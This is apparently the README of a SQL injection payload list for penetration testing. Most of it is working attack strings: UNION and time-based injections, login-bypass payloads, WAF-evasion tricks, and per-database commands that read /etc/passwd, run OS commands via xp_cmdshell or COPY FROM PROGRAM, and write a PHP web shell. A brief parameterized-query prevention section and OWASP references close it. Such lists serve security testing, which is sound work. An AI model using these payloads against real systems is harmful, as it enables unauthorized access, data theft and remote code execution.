 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#
 UNION ALL SELECT 1-- 
 UNION ALL SELECT 1,2-- 
 ... (rest of union payloads)
 UNION SELECT @@VERSION,SLEEP(5),3
 UNION SELECT @@VERSION,SLEEP(5),USER(),4
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5
 ... (rest of union version payloads)
 UNION SELECT @@VERSION,SLEEP(5),"'3
 UNION SELECT @@VERSION,SLEEP(5),"'3'"#
 UNION SELECT @@VERSION,SLEEP(5),USER(),4#
 ... (rest of union user payloads)
 UNION ALL SELECT USER()-- 
 UNION ALL SELECT SLEEP(5)-- 
 UNION ALL SELECT USER(),SLEEP(5)-- 
 UNION ALL SELECT @@VERSION,USER(),SLEEP(5)-- 
 ... (rest of miscellaneous union payloads)
```

## SQL Injection Auth Bypass Payloads

```sql
'-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
```

## Database-Specific Payloads

### MySQL

```sql
# Version and User
SELECT @@VERSION, USER(), DATABASE();

# Table and Column Discovery
SELECT table_name FROM information_schema.tables;
SELECT column_name FROM information_schema.columns WHERE table_name = 'users';

# File Operations (requires permissions)
SELECT 'malicious code' INTO OUTFILE '/var/www/html/shell.php';
SELECT LOAD_FILE('/etc/passwd');

# String Concatenation
SELECT CONCAT('a', 'b');
```

### PostgreSQL

```sql
# Version and User
SELECT version(), current_user, current_database();

# Table and Column Discovery
SELECT tablename FROM pg_catalog.pg_tables WHERE schemaname = 'public';
SELECT column_name FROM information_schema.columns WHERE table_name = 'users';

# Execution and Files
COPY (SELECT 'malicious') TO '/tmp/test';
CREATE TABLE shell(output text);
COPY shell FROM PROGRAM 'id';
SELECT * FROM shell;

# Time Delay
SELECT pg_sleep(5);
```

### Microsoft SQL Server (MSSQL)

```sql
# Version and User
SELECT @@VERSION, SUSER_SNAME(), DB_NAME();

# Table and Column Discovery
SELECT name FROM sysobjects WHERE xtype = 'U';
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'users');

# Command Execution (requires xp_cmdshell enabled)
EXEC xp_cmdshell 'whoami';

# Time Delay
WAITFOR DELAY '0:0:5';
```

### Oracle

```sql
# Version and User
SELECT banner FROM v$version;
SELECT user FROM dual;

# Table and Column Discovery
SELECT table_name FROM all_tables;
SELECT column_name FROM all_tab_columns WHERE table_name = 'USERS';

# Time Delay
BEGIN DBMS_LOCK.SLEEP(5); END;
```

### SQLite

```sql
# Version
SELECT sqlite_version();

# Table and Column Discovery
SELECT name FROM sqlite_master WHERE type='table';
PRAGMA table_info('users');

# File Operations (Attach)
ATTACH DATABASE '/var/www/html/shell.php' AS pwn;
CREATE TABLE pwn.shell (code TEXT);
INSERT INTO pwn.shell (code) VALUES ('<?php system($_GET["cmd"]); ?>');
```

## Polyglot SQL Injection

Polyglot payloads are designed to work across multiple database engines and injection contexts (single quote, double quote, no quote) simultaneously.

```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
' OR 1=1 --
" OR 1=1 --
' OR '1'='1' { % / * / }
```

## Advanced WAF Bypass Techniques

### Encoding & Obfuscation

- **URL Encoding**: `%27%20OR%201%3D1--`
- **Hex Encoding**: `0x61646d696e` (MySQL)
- **Char Encoding**: `CHAR(39, 79, 82, 39, 49, 39, 61, 39, 49)` (MSSQL)

### Whitespace Alternatives

Instead of spaces, try:

- `/**/` (Comments)
- `%09` (Tab)
- `%0a` (Newline)
- `%0b` (Vertical Tab)
- `%0c` (Form Feed)
- `%0d` (Carriage Return)
- `%a0` (Non-breaking space)

### Logical Operators

If `OR` or `AND` are blocked:

- `||` (OR)
- `&&` (AND)
- `^` (XOR)
- `NOT`

### JSON Syntax Obfuscation

Some WAFs fail to parse SQL within JSON structures:

```json
{"id": "1' OR 1=1--"}
```

## WAF Bypass Cheat Sheet

| Technique | Description | Example |
| --- | --- | --- |
| **Case Variation** | Mixing case to bypass simple keyword filters. | `uNiOn SeLeCt` |
| **Comments** | Using inline comments to break keyword detection. | `UNI/**/ON SELECT` |
| **URL Encoding** | Encoding special characters. | `%27%20OR%201%3D1` |
| **Double Encoding** | Encoding twice if a WAF decodes once before filtering. | `%2527` |
| **Hex Encoding** | Using hexadecimal values for strings. | `0x61646d696e` |
| **Unicode** | Using unicode variations. | `U+0027` |
| **Whitespace** | Using tabs, newlines or vertical tabs as separators. | `OR%091=1` |
| **HTTP Parameter Pollution** | Splitting payloads across parameters. | `?id=1'/*&id=*/OR 1=1--` |

## SQL Injection Prevention

SQL Injection can be 100% prevented by using **Parameterized Queries** (also known as Prepared Statements).

### PHP (PDO)

```php
$stmt = $pdo->prepare('SELECT * FROM users WHERE email = :email');
$stmt->execute(['email' => $email]);
$user = $stmt->fetch();
```

### Python (psycopg2)

```python
cur.execute("SELECT * FROM users WHERE username = %s", (username,))
```

### Node.js (mysql2)

```javascript
connection.execute('SELECT * FROM users WHERE id = ?', [userId]);
```

### Go (database/sql)

```go
db.Query("SELECT name FROM users WHERE id = ?", id)
```

## Burp Suite Intruder Payloads

We have prepared an optimized payload list to help you achieve more effective results in security tests (especially when using Burp Suite Intruder). You can load this list directly into the "Payloads" tab of the Intruder.

- **Payload List**: [burp-intruder-payloads.txt](file:///Users/ismailtasdelen/Documents/GitHub/sql-injection-payload-list/burp-intruder-payloads.txt)

### How to Use?

1. Open Burp Suite and send a request to your target.
2. Send the request to **Intruder**.
3. In the **Positions** tab, select the parameters you want to test for SQL injection.
4. Go to the **Payloads** tab.
5. Select `Simple list` as the `Payload type`.
6. In the `Payload Options` section, click the `Load...` button and select the [burp-intruder-payloads.txt](file:///Users/ismailtasdelen/Documents/GitHub/sql-injection-payload-list/burp-intruder-payloads.txt) file, or copy and paste the list above.
7. Click the **Start attack** button to begin the scan.

## References

- **SQL Injection (OWASP)**: [https://www.owasp.org/index.php/SQL_Injection](https://www.owasp.org/index.php/SQL_Injection)
- **Blind SQL Injection**: [https://www.owasp.org/index.php/Blind_SQL_Injection](https://www.owasp.org/index.php/Blind_SQL_Injection)
- **Testing for SQL Injection (OTG-INPVAL-005)**: [https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005)](https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005))
- **SQL Injection Bypassing WAF**: [https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF](https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF)
- **Reviewing Code for SQL Injection**: [https://www.owasp.org/index.php/Reviewing_Code_for_SQL_Injection](https://www.owasp.org/index.php/Reviewing_Code_for_SQL_Injection)
- **PL/SQL: SQL Injection**: [https://www.owasp.org/index.php/PL/SQL:SQL_Injection](https://www.owasp.org/index.php/PL/SQL:SQL_Injection)
- **Testing for NoSQL injection**: [https://www.owasp.org/index.php/Testing_for_NoSQL_injection](https://www.owasp.org/index.php/Testing_for_NoSQL_injection)
- **SQL Injection Injection Prevention Cheat Sheet**: [https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html)
- **SQL Injection Query Parameterization Cheat Sheet**: [https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html)
